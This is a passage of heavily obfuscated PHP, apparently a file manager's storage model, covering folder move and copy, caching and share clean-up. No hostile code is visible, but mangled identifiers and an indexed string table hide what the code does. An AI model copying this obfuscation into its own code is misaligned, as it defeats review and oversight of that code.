$ûÙäç¦; } $ºãèªıñ = array(); $˜ı“¤ˆ = array(); $this->_childrenListAll($©——«à«, $ºãèªıñ); $Ò§äæ„í = count($ºãèªıñ); if ($Ò§äæ„í == 0) { return $ûÙäç¦; } $û„Æô¯À = $this->sourceInfo($ûÙäç¦); foreach ($ºãèªıñ as $åŒá÷²›) { $ÀÔó¶å¹ = $this->_makeItemData($åŒá÷²›, $û„Æô¯À, $åŒá÷²›[$æ£ı„Â»[32]]); $ÀÔó¶å¹[$æ£ı„Â»[529]] = $åŒá÷²›[$æ£ı„Â»[529]]; $˜ı“¤ˆ[] = $ÀÔó¶å¹; } $this->chunkEventSet($æ£ı„Â»[584], array($æ£ı„Â»[585], $×ğ„Úû, $Ò§äæ„í)); $this->addAll($˜ı“¤ˆ, array(), !1); $· ûÁ… = $this->where(array($æ£ı„Â»[440] => $ûÙäç¦))->select(); $Á¢°Š®Š = $this->_childrenMakeRelation($ºãèªıñ, $· ûÁ…); $Á¢°Š®Š[$©——«à«] = $ûÙäç¦; $ô¨³¦Ğ = array(); $‚´Æ« = array(); foreach ($· ûÁ… as $åŒá÷²›) { $ü»²Óíë = $åŒá÷²›[$æ£ı„Â»[410]]; $ûÒĞâÄ± = $this->_childrenMatch($Á¢°Š®Š, $åŒá÷²›, $û„Æô¯À); $ô¨³¦Ğ[] = array($æ£ı„Â»[410], $ü»²Óíë, $æ£ı„Â»[440], $ûÒĞâÄ±[$æ£ı„Â»[440]]); $‚´Æ«[] = array($æ£ı„Â»[410], $ü»²Óíë, $æ£ı„Â»[529], $ûÒĞâÄ±[$æ£ı„Â»[529]]); $this->_copyApplyMeta($åŒá÷²›, $«¿â„ë¡); if ($åŒá÷²›[$æ£ı„Â»[418]] != $æ£ı„Â»[88]) { $«¿â„ë¡[$æ£ı„Â»[574]][] = $åŒá÷²›[$æ£ı„Â»[476]]; } } $this->chunkEventSet($æ£ı„Â»[586], array($æ£ı„Â»[587], $×ğ„Úû, $Ò§äæ„í)); $this->saveAll($ô¨³¦Ğ); $this->chunkEventSet($æ£ı„Â»[588], array($æ£ı„Â»[589], $×ğ„Úû, $Ò§äæ„í)); $this->saveAll($‚´Æ«); return $ûÙäç¦; } private function _childrenMakeRelation($–¤Œğ’¯, $Ò¹‡Ñ°¢) { $£ÁÔ÷ıó =& $_SERVER[ Ö‘ñÄ”]; $ñ†Ù„ ¥ = array(); $›‡ÏİÒ = array(); foreach ($–¤Œğ’¯ as $ì¬™ÇØÅ) { $‘Ã¶Ìğ = $ì¬™ÇØÅ[$£ÁÔ÷ıó[32]] . $£ÁÔ÷ıó[8] . $ì¬™ÇØÅ[$£ÁÔ÷ıó[529]]; $ñ†Ù„ ¥[$‘Ã¶Ìğ] = $ì¬™ÇØÅ[$£ÁÔ÷ıó[410]]; } foreach ($Ò¹‡Ñ°¢ as $ì¬™ÇØÅ) { $‘Ã¶Ìğ = $ì¬™ÇØÅ[$£ÁÔ÷ıó[32]] . $£ÁÔ÷ıó[8] . $ì¬™ÇØÅ[$£ÁÔ÷ıó[529]]; $–€åËœ¬ = $ñ†Ù„ ¥[$‘Ã¶Ìğ]; $›‡ÏİÒ[$–€åËœ¬] = $ì¬™ÇØÅ[$£ÁÔ÷ıó[410]]; } return $›‡ÏİÒ; } private function _childrenMatch($Ú‚ı¿Šğ, $Ú·í¶Ù, $«â¥è¡—) { $šù™·Ã· =& $_SERVER[ Ö‘ñÄ”]; $Ã´¼³¬ğ = $«â¥è¡—[$šù™·Ã·[529]]; $ßó­·Ú = $this->parentLevelArray($Ú·í¶Ù[$šù™·Ã·[529]]); foreach ($ßó­·Ú as $öÓË¼¿ß) { if (isset($Ú‚ı¿Šğ[$öÓË¼¿ß])) { $Ã´¼³¬ğ .= $Ú‚ı¿Šğ[$öÓË¼¿ß] . $šù™·Ã·[590]; } } $Ã´¼³¬ğ = rtrim($Ã´¼³¬ğ, $šù™·Ã·[50]) . $šù™·Ã·[50]; $ÙÏöœ¹± = $this->parentLevelArray($Ã´¼³¬ğ); $æÈ½„ı× = $ÙÏöœ¹±[count($ÙÏöœ¹±) - 1]; return array($šù™·Ã·[440] => $æÈ½„ı×, $šù™·Ã·[529] => $Ã´¼³¬ğ); } private function _makeItemData($›âöÛ¤, $ÒŸŠÔï©, $ª›Ş’å) { $ù‡˜¨Ÿ¹ =& $_SERVER[ Ö‘ñÄ”]; $ˆÆôù½¢ = array($ù‡˜¨Ÿ¹[591] => $›âöÛ¤[$ù‡˜¨Ÿ¹[418]], $ù‡˜¨Ÿ¹[428] => $ª›Ş’å, $ù‡˜¨Ÿ¹[592] => $›âöÛ¤[$ù‡˜¨Ÿ¹[420]] ? $›âöÛ¤[$ù‡˜¨Ÿ¹[420]] : $ù‡˜¨Ÿ¹[12], $ù‡˜¨Ÿ¹[477] => $›âöÛ¤[$ù‡˜¨Ÿ¹[476]] ? $›âöÛ¤[$ù‡˜¨Ÿ¹[476]] : 0, $ù‡˜¨Ÿ¹[593] => $›âöÛ¤[$ù‡˜¨Ÿ¹[76]] ? $›âöÛ¤[$ù‡˜¨Ÿ¹[76]] : 0, $ù‡˜¨Ÿ¹[594] => intval($ÒŸŠÔï©[$ù‡˜¨Ÿ¹[419]]), $ù‡˜¨Ÿ¹[595] => intval($ÒŸŠÔï©[$ù‡˜¨Ÿ¹[513]]), $ù‡˜¨Ÿ¹[596] => intval(USER_ID), $ù‡˜¨Ÿ¹[597] => intval(USER_ID), $ù‡˜¨Ÿ¹[409] => intval($ÒŸŠÔï©[$ù‡˜¨Ÿ¹[410]]), $ù‡˜¨Ÿ¹[598] => $ÒŸŠÔï©[$ù‡˜¨Ÿ¹[529]] . $ÒŸŠÔï©[$ù‡˜¨Ÿ¹[410]] . $ù‡˜¨Ÿ¹[50], $ù‡˜¨Ÿ¹[432] => $›âöÛ¤[$ù‡˜¨Ÿ¹[85]] ? $›âöÛ¤[$ù‡˜¨Ÿ¹[85]] : time(), $ù‡˜¨Ÿ¹[438] => 0, $ù‡˜¨Ÿ¹[599] => $ù‡˜¨Ÿ¹[12]); return $ˆÆôù½¢; } private function _copyApplyMeta($ÜÙò’¿, &$­©–ô×) { $µ·õë© =& $_SERVER[ Ö‘ñÄ”]; $½Åñ¿½Â = $ÜÙò’¿[$µ·õë©[410]]; $¼îêšÑÁ = $ÜÙò’¿[$µ·õë©[32]]; if (!isset($ÜÙò’¿[$µ·õë©[600]]) || !$ÜÙò’¿[$µ·õë©[600]] || $ÜÙò’¿[$µ·õë©[600]] == $µ·õë©[197]) { $­©–ô×[$µ·õë©[576]][] = array($µ·õë©[410], $½Åñ¿½Â, $µ·õë©[600], short_id($½Åñ¿½Â)); } if (Input::check($¼îêšÑÁ, $µ·õë©[601])) { $­©–ô×[$µ·õë©[575]][] = array($µ·õë©[410] => $½Åñ¿½Â, $µ·õë©[94] => $µ·õë©[473], $µ·õë©[383] => str_replace($µ·õë©[53], $µ·õë©[12], Pinyin::get($¼îêšÑÁ))); $­©–ô×[$µ·õë©[575]][] = array($µ·õë©[410] => $½Åñ¿½Â, $µ·õë©[94] => $µ·õë©[472], $µ·õë©[383] => Pinyin::get($¼îêšÑÁ, $µ·õë©[602])); } $­©–ô×[$µ·õë©[575]][] = array($µ·õë©[410] => $½Åñ¿½Â, $µ·õë©[94] => $µ·õë©[452], $µ·õë©[383] => KodSort::makeStr($¼îêšÑÁ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ø³Œ±™) { $ü‡âÀÃ =& $_SERVER[ Ö‘ñÄ”]; $™¬ÂúÍ” = $this->sourceInfo($Ø³Œ±™); $”ÓšŒ¨© = $ü‡âÀÃ[603]; $ß¦ª€¨ = array($ü‡âÀÃ[529] => array($ü‡âÀÃ[558], $™¬ÂúÍ”[$ü‡âÀÃ[529]] . $Ø³Œ±™ . $ü‡âÀÃ[559]), $ü‡âÀÃ[439] => $this->targetIsDelete); $ö„™¸™ = $this->field($”ÓšŒ¨©)->where($ß¦ª€¨)->select(); if (!$ö„™¸™) { return; } $ö„™¸™ = array_to_keyvalue($ö„™¸™, $ü‡âÀÃ[410]); foreach ($ö„™¸™ as $éŸ¾§ÁØ) { $¦î¬¹ºû = $éŸ¾§ÁØ[$ü‡âÀÃ[440]]; $Ø³Œ±™ = $éŸ¾§ÁØ[$ü‡âÀÃ[410]]; if (!isset($this->_childrenListCache[$Ø³Œ±™]) && $éŸ¾§ÁØ[$ü‡âÀÃ[418]] == $ü‡âÀÃ[88]) { $this->_childrenListCache[$Ø³Œ±™] = array(); } if (!isset($this->_childrenListCache[$¦î¬¹ºû])) { $this->_childrenListCache[$¦î¬¹ºû] = array(); } $this->_childrenListCache[$¦î¬¹ºû][$Ø³Œ±™] = $éŸ¾§ÁØ; $this->_childrenItemCache[$Ø³Œ±™] = $éŸ¾§ÁØ; } } private function _childrenListAll($“ƒ´†¡, &$ôõÑ—·Ã) { $º¨ÙÑà =& $_SERVER[ Ö‘ñÄ”]; if (!isset($this->_childrenListCache[$“ƒ´†¡])) { return; } $¦öºÛ”ª = $this->_childrenListCache[$“ƒ´†¡]; foreach ($¦öºÛ”ª as $ı“¦ÓÄĞ => $«‰•„°È) { $ôõÑ—·Ã[$ı“¦ÓÄĞ] = $«‰•„°È; if ($«‰•„°È[$º¨ÙÑà[418]] == $º¨ÙÑà[88]) { $this->_childrenListAll($ı“¦ÓÄĞ, $ôõÑ—·Ã); } } } private function sourceInfoCache($ô½ë€) { if (isset($this->_childrenItemCache[$ô½ë€])) { return $this->_childrenItemCache[$ô½ë€]; } return $this->sourceInfo($ô½ë€); } private function _childrenList($•Æ¿ÑÈ¼) { if (isset($this->_childrenListCache[$•Æ¿ÑÈ¼])) { return $this->_childrenListCache[$•Æ¿ÑÈ¼]; } return $this->_childrenListSelect($•Æ¿ÑÈ¼); } private function _childrenListSelect($¸¥®…ô¸) { $ò‡ê„Æú =& $_SERVER[ Ö‘ñÄ”]; $şŞ“Ğ¡ = array($ò‡ê„Æú[440] => $¸¥®…ô¸, $ò‡ê„Æú[439] => $this->targetIsDelete); $ƒ©üìëú = $this->where($şŞ“Ğ¡)->select(); $ƒ©üìëú = $ƒ©üìëú ? $ƒ©üìëú : array(); $ó“½Æšî = array_to_keyvalue($ƒ©üìëú, $ò‡ê„Æú[410]); $this->_childrenListCache[$¸¥®…ô¸] = $ó“½Æšî; foreach ($ó“½Æšî as $¸¥®…ô¸ => $ä£øŒı) { $this->_childrenItemCache[$¸¥®…ô¸] = $ä£øŒı; } return $ó“½Æšî; } private function fileNameExistCache($¦û²Íƒñ, $ë÷´‚Æ½) { $ËÉ§Å­Û =& $_SERVER[ Ö‘ñÄ”]; $ë÷´‚Æ½ = strtolower($ë÷´‚Æ½); $Ï†ö†Ã¼ = $this->_childrenList($¦û²Íƒñ); foreach ($Ï†ö†Ã¼ as $¾›Šçæ—) { if ($ë÷´‚Æ½ == strtolower($¾›Šçæ—[$ËÉ§Å­Û[32]])) { return $¾›Šçæ—[$ËÉ§Å­Û[410]]; } } return !1; } private function fileNameAutoCache($®Ó®§, $´ÕÄøĞò, $³Šò…­—, $íéîñö) { $À»ïİı¨ =& $_SERVER[ Ö‘ñÄ”]; $½ÌÉùãÑ = $this->_childrenList($®Ó®§); $¡™è¹ê‘ = array_to_keyvalue($½ÌÉùãÑ, $À»ïİı¨[12], $À»ïİı¨[32]); return $this->fileNameAutoGet($¡™è¹ê‘, $´ÕÄøĞò, $³Šò…­—, $íéîñö); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($‹ì®°…, $ª®ô‰â…, $×ˆëÇ¹Ô = REPEAT_REPLACE, $­›ûÈ¶ = '') { $ÆÊ Šµø =& $_SERVER[ Ö‘ñÄ”]; $ªÇåí°– = $this->sourceInfo($‹ì®°…); $Ç›±‘Åô = $this->sourceInfo($ª®ô‰â…); if ($ªÇåí°–[$ÆÊ Šµø[440]] == $Ç›±‘Åô[$ÆÊ Šµø[410]]) { if ($ªÇåí°–[$ÆÊ Šµø[439]] == $ÆÊ Šµø[88]) { Model($ÆÊ Šµø[437])->restore(array($‹ì®°…)); } if (!$­›ûÈ¶ || $­›ûÈ¶ == $ªÇåí°–[$ÆÊ Šµø[32]]) { return $‹ì®°…; } } $üşÖèï— = $this->pathInfoMore($‹ì®°…); if ($this->isParentOf($‹ì®°…, $ª®ô‰â…)) { return !1; } if (!$ªÇåí°– || !$Ç›±‘Åô || $Ç›±‘Åô[$ÆÊ Šµø[418]] != $ÆÊ Šµø[88]) { return !1; } Hook::trigger($ÆÊ Šµø[604], $üşÖèï—); $this->targetIsDelete = intval($ªÇåí°–[$ÆÊ Šµø[439]]); if ($ªÇåí°–[$ÆÊ Šµø[440]] == $ª®ô‰â… && $­›ûÈ¶ != $ªÇåí°–[$ÆÊ Šµø[32]]) { $æÃ¢ÇÌÖ = $this->fileNameExist($ª®ô‰â…, $­›ûÈ¶); if ($æÃ¢ÇÌÖ && $ªÇåí°–[$ÆÊ Šµø[418]] == $ÆÊ Šµø[197]) { $ªµË°ƒ© = $this->sourceInfo($æÃ¢ÇÌÖ); $¸Ù°ğŸ° = $this->fileHistory($ªµË°ƒ©, $ªÇåí°–[$ÆÊ Šµø[476]], $ªÇåí°–[$ÆÊ Šµø[76]]); if (!$¸Ù°ğŸ°) { Model($ÆÊ Šµø[479])->remove($ªÇåí°–[$ÆÊ Šµø[476]]); } $this->removeNow($‹ì®°…, !1); $this->folderSizeReset($ª®ô‰â…); Hook::trigger($ÆÊ Šµø[605], $üşÖèï—); return $æÃ¢ÇÌÖ; } } $Œ²™‡ƒì = $­›ûÈ¶ ? $­›ûÈ¶ : $ªÇåí°–[$ÆÊ Šµø[32]]; $this->lockMoveStart($‹ì®°…); $this->lockWriteStart($ª®ô‰â…, $Œ²™‡ƒì); $íæÂ×Æé = array($ÆÊ Šµø[574] => array(), $ÆÊ Šµø[606] => !1); $this->clearShare($‹ì®°…, $ª®ô‰â…); $Ó±ğˆ¢ = $this->fileNameExistCache($ª®ô‰â…, $ªÇåí°–[$ÆÊ Šµø[32]]); $ö¶„µÑ’ = $this->_move($‹ì®°…, $ª®ô‰â…, $×ˆëÇ¹Ô, $íæÂ×Æé, $­›ûÈ¶); $this->sourceCacheClear(); if ($ªÇåí°–[$ÆÊ Šµø[418]] == $ÆÊ Šµø[88] && $Ó±ğˆ¢) { $this->folderSizeResetChildren($ö¶„µÑ’); } Model($ÆÊ Šµø[199])->linkAdd($íæÂ×Æé[$ÆÊ Šµø[574]]); if ($Ó±ğˆ¢ && $íæÂ×Æé[$ÆÊ Šµø[606]]) { $this->removeNow($‹ì®°…, !1); } $this->lockMoveEnd($‹ì®°…); $this->lockWriteEnd($ª®ô‰â…, $Œ²™‡ƒì); $this->folderSizeReset($ªÇåí°–[$ÆÊ Šµø[440]]); $this->folderSizeReset($ª®ô‰â…); $î«Ø•øâ = array($ªÇåí°–[$ÆÊ Šµø[440]], $ª®ô‰â…); if ($ªÇåí°–[$ÆÊ Šµø[418]] == $ÆÊ Šµø[88]) { $î«Ø•øâ[] = $‹ì®°…; } $this->updateModifyTime($î«Ø•øâ); Model($ÆÊ Šµø[578])->eventMove($‹ì®°…, $ªÇåí°–[$ÆÊ Šµø[440]], $ª®ô‰â…); Hook::trigger($ÆÊ Šµø[605], $üşÖèï—); return $ö¶„µÑ’; } private function _move($ßÔ†¦×, $ñ¼ìŒˆ, $–ù³ÔÁÖ, &$Ÿæ—›¥µ, $¢™›üåÕ = '') { $ïËö¡©¨ =& $_SERVER[ Ö‘ñÄ”]; $ŠŞÜª‡á = $this->sourceInfo($ßÔ†¦×); $µìû•ª€ = $ŠŞÜª‡á[$ïËö¡©¨[418]] == $ïËö¡©¨[88]; $ƒ»¶üöô = $¢™›üåÕ ? $¢™›üåÕ : $ŠŞÜª‡á[$ïËö¡©¨[32]]; $¡²Ç“ş = $this->fileNameExistCache($ñ¼ìŒˆ, $ƒ»¶üöô); $this->lockMoveStart($ßÔ†¦×); $this->lockWriteStart($ñ¼ìŒˆ, $ƒ»¶üöô); if (!$¡²Ç“ş) { return $this->_moveForce($ßÔ†¦×, $ñ¼ìŒˆ, $ƒ»¶üöô); } $¦ÎûÍÇÓ = $¡²Ç“ş; $Òï¼Ÿô¬ = !1; if ($µìû•ª€) { if ($–ù³ÔÁÖ == REPEAT_RENAME_FOLDER) { $ƒ»¶üöô = $this->fileNameAuto($ñ¼ìŒˆ, $ƒ»¶üöô, $–ù³ÔÁÖ, $µìû•ª€); $¦ÎûÍÇÓ = $this->_moveForce($ßÔ†¦×, $ñ¼ìŒˆ, $ƒ»¶üöô); } else { if ($–ù³ÔÁÖ == REPEAT_RENAME_FOLDER) { $–ù³ÔÁÖ = REPEAT_RENAME; } $•€Æ¸ õ = $this->_childrenListSelect($ßÔ†¦×); foreach ($•€Æ¸ õ as $­ëêâîÖ) { $this->_move($­ëêâîÖ[$ïËö¡©¨[410]], $¡²Ç“ş, $–ù³ÔÁÖ, $Ÿæ—›¥µ); } $Òï¼Ÿô¬ = !0; } } else { if ($–ù³ÔÁÖ == REPEAT_SKIP) { $Òï¼Ÿô¬ = !0; } else { if ($–ù³ÔÁÖ == REPEAT_RENAME || $–ù³ÔÁÖ == REPEAT_RENAME_FOLDER) { $ƒ»¶üöô = $this->fileNameAuto($ñ¼ìŒˆ, $ƒ»¶üöô, $–ù³ÔÁÖ, $µìû•ª€); $¦ÎûÍÇÓ = $this->_moveForce($ßÔ†¦×, $ñ¼ìŒˆ, $ƒ»¶üöô); } else { if ($–ù³ÔÁÖ == REPEAT_REPLACE) { $áÚ—ü¾ = $this->sourceInfoCache($¡²Ç“ş); $–‰Õš”é = $this->fileHistory($áÚ—ü¾, $ŠŞÜª‡á[$ïËö¡©¨[476]], $ŠŞÜª‡á[$ïËö¡©¨[76]]); $Òï¼Ÿô¬ = !0; if ($–‰Õš”é) { $Ÿæ—›¥µ[$ïËö¡©¨[574]][] = $ŠŞÜª‡á[$ïËö¡©¨[476]]; } } } } } if ($Òï¼Ÿô¬ && !$Ÿæ—›¥µ[$ïËö¡©¨[606]]) { $Ÿæ—›¥µ[$ïËö¡©¨[606]] = !0; } return $¦ÎûÍÇÓ; } private function _moveForce($õúÆ®‰œ, $£ş˜ïö¹, $Ñ¼ßœîÉ) { $ë››ºß =& $_SERVER[ Ö‘ñÄ”]; $è÷ŸÓ˜Ç = $this->sourceInfo($õúÆ®‰œ); $¨‹İ¢µ« = $this->sourceInfo($£ş˜ïö¹); $†¯•ƒí = $è÷ŸÓ˜Ç[$ë››ºß[418]] == $ë››ºß[88]; $ä¿£‹îñ = array($ë››ºß[409] => $¨‹İ¢µ«[$ë››ºß[410]], $ë››ºß[598] => $¨‹İ¢µ«[$ë››ºß[529]] . $¨‹İ¢µ«[$ë››ºß[410]] . $ë››ºß[50], $ë››ºß[594] => $¨‹İ¢µ«[$ë››ºß[419]], $ë››ºß[595] => $¨‹İ¢µ«[$ë››ºß[513]], $ë››ºß[597] => USER_ID, $ë››ºß[428] => $Ñ¼ßœîÉ); $´®²ÀËš = $è÷ŸÓ˜Ç[$ë››ºß[419]] == SourceModel::TYPE_GROUP && $¨‹İ¢µ«[$ë››ºß[419]] == SourceModel::TYPE_GROUP && $è÷ŸÓ˜Ç[$ë››ºß[513]] == $¨‹İ¢µ«[$ë››ºß[513]]; if (!$´®²ÀËš && $this->moveClearAuth) { Model($ë››ºß[510])->authClear($õúÆ®‰œ); } $ÔËõ§è = $è÷ŸÓ˜Ç[$ë››ºß[439]] == $ë››ºß[88] && $¨‹İ¢µ«[$ë››ºß[439]] != $ë››ºß[88]; if ($ÔËõ§è) { $ä¿£‹îñ[$ë››ºß[438]] = 0; } if ($†¯•ƒí) { $‰Ÿïš’ = array($ë››ºß[598] => array($ë››ºß[558], $è÷ŸÓ˜Ç[$ë››ºß[529]] . $è÷ŸÓ˜Ç[$ë››ºß[410]] . $ë››ºß[559])); $òÖ€¹¶¤ = $è÷ŸÓ˜Ç[$ë››ºß[529]] . $è÷ŸÓ˜Ç[$ë››ºß[410]] . $ë››ºß[50]; $çîáö  = $¨‹İ¢µ«[$ë››ºß[529]] . $¨‹İ¢µ«[$ë››ºß[410]] . $ë››ºß[50] . $è÷ŸÓ˜Ç[$ë››ºß[410]] . $ë››ºß[50]; $÷ı‘¸ö = array($ë››ºß[598] => array($ë››ºß[607], "\x72\145\160\x6c\x61\143\x65\50\160\x61\x72\x65\156\164\114\x65\166\x65\154\x2c\47{$òÖ€¹¶¤}\x27\54\47{$çîáö }\x27\x29"), $ë››ºß[594] => $¨‹İ¢µ«[$ë››ºß[419]], $ë››ºß[595] => $¨‹İ¢µ«[$ë››ºß[513]]); if ($ÔËõ§è) { $÷ı‘¸ö[$ë››ºß[438]] = 0; } $this->where($‰Ÿïš’)->data($÷ı‘¸ö)->save(); } $this->where(array($ë››ºß[425] => $õúÆ®‰œ))->data($ä¿£‹îñ)->save(); return $õúÆ®‰œ; } private function clearShare($æ ï˜²Ü, $é¿ì†‡Õ) { $«ÖÌ»¡¡ =& $_SERVER[ Ö‘ñÄ”]; $½ÑÜÑşÁ = $this->sourceInfo($æ ï˜²Ü); $íÖãõÈÃ = $this->sourceInfo($é¿ì†‡Õ); if ($½ÑÜÑşÁ[$«ÖÌ»¡¡[513]] == $íÖãõÈÃ[$«ÖÌ»¡¡[513]] && $½ÑÜÑşÁ[$«ÖÌ»¡¡[419]] == $«ÖÌ»¡¡[608]) { return; } $õÂ«½øí = array($«ÖÌ»¡¡[529] => array($«ÖÌ»¡¡[558], $½ÑÜÑşÁ[$«ÖÌ»¡¡[529]] . $æ ï˜²Ü . $«ÖÌ»¡¡[559])); $Ñ‡°İ¼¯ = $this->field($«ÖÌ»¡¡[425])->where($õÂ«½øí)->getField($«ÖÌ»¡¡[410], !0); if (!$Ñ‡°İ¼¯) { return; } $õÂ«½øí = array($«ÖÌ»¡¡[410] => array($«ÖÌ»¡¡[7], $Ñ‡°İ¼¯), $«ÖÌ»¡¡[504] => 1); $óãúåúƒ = Model($«ÖÌ»¡¡[609])->field($«ÖÌ»¡¡[497])->where($õÂ«½øí)->select(); if (!$óãúåúƒ) { return; } $óãúåúƒ = array_to_keyvalue($óãúåúƒ, $«ÖÌ»¡¡[12], $«ÖÌ»¡¡[497]); $õÂ«½øí = array($«ÖÌ»¡¡[497] => array($«ÖÌ»¡¡[7], $óãúåúƒ)); Model($«ÖÌ»¡¡[609])->where($õÂ«½øí)->save(array($«ÖÌ»¡¡[504] => 0)); Model($«ÖÌ»¡¡[610])->where($õÂ«½øí)->delete(); } public function copyFolderFromIO($×ÕÑÏ¯, $Û“¡ª·ä, $éÍ‘Í¸, $å±Íòø›, $õêÛ£‹ò, $âáßÓ¨Š = false) { $ºÕİî£» =& $_SERVER[ Ö‘ñÄ”]; $àò™»óñ = array($ºÕİî£»[575] => array(), $ºÕİî£»[576] => array(), $ºÕİî£»[574] => array(), $ºÕİî£»[611] => array()); $Ëêº´¸Ô = $âáßÓ¨Š ? $âáßÓ¨Š : $×ÕÑÏ¯->pathThis($Û“¡ª·ä); $Ññ¤åÀ = $this->fileNameExist($éÍ‘Í¸, $Ëêº´¸Ô); $Ù´ºŒœå = $this->mkdir($éÍ‘Í¸, $Ëêº´¸Ô, $å±Íòø›); if (!$Ññ¤åÀ || $å±Íòø› == REPEAT_RENAME_FOLDER) { $å±Íòø› = !1; } if ($Ññ¤åÀ) { $this->_childrenAllMake($Ññ¤åÀ); } Hook::trigger($ºÕİî£»[612]); $this->_copyChildTo($×ÕÑÏ¯, $Û“¡ª·ä, $Ù´ºŒœå, $å±Íòø›, $àò™»óñ, $õêÛ£‹ò); Hook::trigger($ºÕİî£»[613]); if ($Ù´ºŒœå) { $this->folderSizeResetChildren($Ù´ºŒœå); } $this->_childrenListClear(); Model($ºÕİî£»[577])->addAll($àò™»óñ[$ºÕİî£»[575]], array(), !0); Model($ºÕİî£»[578])->eventCopy($Ù´ºŒœå); $this->saveAll($àò™»óñ[$ºÕİî£»[576]]); Model($ºÕİî£»[479])->linkAdd($àò™»óñ[$ºÕİî£»[574]]); Model($ºÕİî£»[479])->remove($àò™»óñ[$ºÕİî£»[611]]); $this->folderSizeReset($éÍ‘Í¸); $this->updateModifyTime($éÍ‘Í¸); return $Ù´ºŒœå; } private function _copyChildTo($¸¬Ü¦çš, $şëŒ§Á, $Û«×ºö¥, $ñÏûªéş, &$ò¯èç¬, $®«Ğù) { $§šª§Ú¨ =& $_SERVER[ Ö‘ñÄ”]; $¶‡˜™¬ = $this->sourceInfoCache($Û«×ºö¥); $Â¤¬³“¶ = $¸¬Ü¦çš->listPath($şëŒ§Á); $Â¤¬³“¶ = $Â¤¬³“¶ ? $Â¤¬³“¶ : array($§šª§Ú¨[83] => array(), $§šª§Ú¨[82] => array()); $Ğ’Ê¸Ï = array_merge($Â¤¬³“¶[$§šª§Ú¨[83]], $Â¤¬³“¶[$§šª§Ú¨[82]]); $Ğ«£Ùé€ = $this->_addFiles($¸¬Ü¦çš, $Â¤¬³“¶[$§šª§Ú¨[83]], $®«Ğù); $şíœıÜ¶ = array(); foreach ($Ğ’Ê¸Ï as &$ŠºÜ¿ç) { if (isset($Ğ«£Ùé€[$ŠºÜ¿ç[$§šª§Ú¨[32]]])) { $ŠºÜ¿ç = $Ğ«£Ùé€[$ŠºÜ¿ç[$§šª§Ú¨[32]]]; } $ŠºÜ¿ç[$§šª§Ú¨[418]] = $ŠºÜ¿ç[$§šª§Ú¨[33]] == $§šª§Ú¨[75]; $ŠºÜ¿ç[$§šª§Ú¨[420]] = substr(_get($ŠºÜ¿ç, $§šª§Ú¨[174], $§šª§Ú¨[12]), 0, 10); $ŠºÜ¿ç[$§šª§Ú¨[76]] = _get($ŠºÜ¿ç, $§šª§Ú¨[76], 0); $ŠºÜ¿ç[$§šª§Ú¨[476]] = _get($ŠºÜ¿ç, $§šª§Ú¨[476], 0); if (!isset($ŠºÜ¿ç[$§šª§Ú¨[614]]) && $ŠºÜ¿ç[$§šª§Ú¨[476]]) { $ò¯èç¬[$§šª§Ú¨[611]][] = $ŠºÜ¿ç[$§šª§Ú¨[476]]; } if ($ñÏûªéş) { $¬Ôí¨ªí = $this->fileNameExistCache($Û«×ºö¥, $ŠºÜ¿ç[$§šª§Ú¨[32]]); if ($¬Ôí¨ªí) { if ($ŠºÜ¿ç[$§šª§Ú¨[418]] || $ñÏûªéş == REPEAT_SKIP) { continue; } if ($ñÏûªéş == REPEAT_REPLACE) { $³Ì î‡„ = $this->sourceInfoCache($¬Ôí¨ªí); $¤º¤ûá† = $this->fileHistory($³Ì î‡„, $ŠºÜ¿ç[$§šª§Ú¨[476]], $ŠºÜ¿ç[$§šª§Ú¨[76]]); if ($¤º¤ûá†) { $ò¯èç¬[$§šª§Ú¨[574]][] = $ŠºÜ¿ç[$§šª§Ú¨[476]]; } continue; } else { if ($ñÏûªéş == REPEAT_RENAME) { $ŠºÜ¿ç[$§šª§Ú¨[32]] = $this->fileNameAutoCache($Û«×ºö¥, $ŠºÜ¿ç[$§šª§Ú¨[32]], $ñÏûªéş, !1); } } } } if (!$ŠºÜ¿ç[$§šª§Ú¨[418]] && $ŠºÜ¿ç[$§šª§Ú¨[476]] == 0) { continue; } if (!$ŠºÜ¿ç[$§šª§Ú¨[418]] && $ŠºÜ¿ç[$§šª§Ú¨[476]]) { $ò¯èç¬[$§šª§Ú¨[574]][] = $ŠºÜ¿ç[$§šª§Ú¨[476]]; } $şíœıÜ¶[] = $this->_makeItemData($ŠºÜ¿ç, $¶‡˜™¬, $ŠºÜ¿ç[$§šª§Ú¨[32]]); } unset($ŠºÜ¿ç); if (!empty($şíœıÜ¶)) { $this->addAll($şíœıÜ¶); $this->_childrenListSelect($Û«×ºö¥); } $îŸ¿‹ÚÑ = $this->_childrenList($Û«×ºö¥); $îŸ¿‹ÚÑ = array_to_keyvalue($îŸ¿‹ÚÑ, $§šª§Ú¨[32]); foreach ($Ğ’Ê¸Ï as $ŠºÜ¿ç) { $³Ì î‡„ = $îŸ¿‹ÚÑ[$ŠºÜ¿ç[$§šª§Ú¨[32]]]; $¸ï‰û®Ä = $³Ì î‡„[$§šª§Ú¨[410]]; $this->_copyApplyMeta($³Ì î‡„, $ò¯èç¬); if ($ŠºÜ¿ç[$§šª§Ú¨[33]] == $§šª§Ú¨[75]) { $ŠºÜ¿ç[$§šª§Ú¨[84]] = $¸¬Ü¦çš->getPathInner($ŠºÜ¿ç[$§šª§Ú¨[84]]); $this->_copyChildTo($¸¬Ü¦çš, $ŠºÜ¿ç[$§šª§Ú¨[84]], $¸ï‰û®Ä, $ñÏûªéş, $ò¯èç¬, $®«Ğù); } } } private function _addFiles($›‘—Ûª, $“©»Ÿ”, $Äğµå‡) { $ ÀÔ˜ªĞ =& $_SERVER[ Ö‘ñÄ”]; if (!$“©»Ÿ” || count($“©»Ÿ”) == 0) { return array(); } $üŸş¸’Ó = array(); foreach ($“©»Ÿ” as &$Ù¼©’ê²) { Hook::trigger($ ÀÔ˜ªĞ[615], $Ù¼©’ê²); $Ù¼©’ê²[$ ÀÔ˜ªĞ[84]] = $›‘—Ûª->getPathInner($Ù¼©’ê²[$ ÀÔ˜ªĞ[84]]); $ƒ§Àøş† = $›‘—Ûª->hashSimple($Ù¼©’ê²[$ ÀÔ˜ªĞ[84]]); $¥²’Òï¢ = $›‘—Ûª->hashMd5($Ù¼©’ê²[$ ÀÔ˜ªĞ[84]]); if (strlen($¥²’Òï¢) > 10 && !isset($üŸş¸’Ó[$¥²’Òï¢])) { $üŸş¸’Ó[$¥²’Òï¢] = array(); } $Ù¼©’ê²[$ 